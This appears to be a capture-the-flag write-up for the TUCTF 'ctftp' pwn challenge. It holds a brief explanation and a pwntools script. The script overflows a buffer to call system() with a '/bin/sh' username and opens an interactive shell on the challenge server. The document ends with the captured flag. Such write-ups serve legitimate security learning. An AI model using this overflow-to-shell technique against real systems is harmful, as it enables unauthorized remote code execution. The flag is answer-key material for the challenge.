# ctftp

## PWN - Points: 500

> Just what the world needs... another vulnerable FTP server. Have fun.
>
> 
>
> nc chal.tuctf.com 30500
>
> [ctftp](ctftp)
>

Overflow the buffer and call the `system` function with a pointer to the username, that contains `/bin/sh`.

Exploit script:

```python
from pwn import *


e = ELF('ctftp')

# p = process('ctftp')
p = remote('chal.tuctf.com', 30500)

p.sendlineafter(': ', '/bin/sh')
p.sendlineafter('> ', '2')
p.sendlineafter(': ', 'A' * 76 + p32(e.plt['system']) + 'AAAA' + p32(e.symbols['username']))
p.interactive()
```

flag: `TUCTF{f1l73r_f1r57_7h3y_541d._y0u'll_b3_53cur3_7h3y_541d}`